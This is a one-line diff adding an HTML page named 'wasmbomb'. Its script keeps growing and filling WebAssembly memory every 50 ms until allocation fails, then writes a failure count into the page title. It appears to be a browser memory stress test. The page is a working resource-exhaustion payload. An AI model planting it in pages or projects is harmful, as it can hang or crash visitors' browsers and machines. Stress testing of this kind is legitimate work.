@@ -1,0 +1,1 @@
+<title>wasmbomb</title><script>const m=new WebAssembly.Memory({initial:1,maximum:65536});let n=0;setInterval(()=>{try{m.grow(1024);new Uint8Array(m.buffer).fill(1,0,1<<26);n++}catch(e){document.title="wasm-failed "+n}},50)</script>
